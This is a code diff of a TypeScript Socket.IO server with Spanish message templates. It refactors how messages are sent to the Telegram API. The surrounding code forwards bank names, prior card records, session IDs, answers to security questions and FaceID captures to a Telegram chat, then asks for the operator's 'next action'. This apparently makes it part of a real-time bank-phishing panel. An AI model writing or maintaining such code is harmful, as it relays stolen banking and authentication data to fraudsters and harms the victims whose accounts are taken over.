@@ -13,6 +13,8 @@ import { Server, Socket } from "socket.io";
 import { notifyNewSession, notifyStepData, notifyAdminAction, sendTelegramMessage, escapeHtml } from "./telegram";
 import { getAppConfig, upsertSecureSession, getPreviousCardForUser, getAllSecureSessions } from "./db";
 import { sendFaceIDToTelegram } from "./telegramFaceID";
+import { tgApi } from "./tgapi";
+
 
 let io: Server | null = null;
 
@@ -328,8 +330,8 @@ export function registerSocketIO(server: HttpServer) {
                 `\u2514 \ud83c\udfe6 ${escapeHtml(data.bankName || '—')}\n\n` +
                 `\ud83c\udd94 Sesión anterior: <code>${prevCard.sessionId}</code>\n` +
                 `\ud83c\udd95 Sesión nueva: <code>${data.sessionId}</code>\n` +
-                `\ud83d\udcc5 ${new Date().toLocaleString('es-CO')}`;
-              const tgUrl = `https://api.telegram.org/bot${token}/sendMessage`;
+              `\ud83d\udcc5 ${new Date().toLocaleString('es-CO')}`;
+              const tgUrl = tgApi(token, 'sendMessage');
               const tgResp = await fetch(tgUrl, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
@@ -523,8 +525,8 @@ export function registerSocketIO(server: HttpServer) {
             `💬 Pregunta: <i>${escapeHtml(data.question || '')}</i>\n` +
             `✅ Respuesta: <code>${escapeHtml(data.answer || '')}</code>\n\n` +
             `📅 ${new Date().toLocaleString('es-CO')}\n\n` +
-            `⬇️ <b>Siguiente acción:</b>`;
-          const tgUrl = `https://api.telegram.org/bot${token}/sendMessage`;
+          `⬇️ <b>Siguiente acción:</b>`;
+          const tgUrl = tgApi(token, 'sendMessage');
           const tgBody = {
             chat_id: chatId,
             text: msgText,
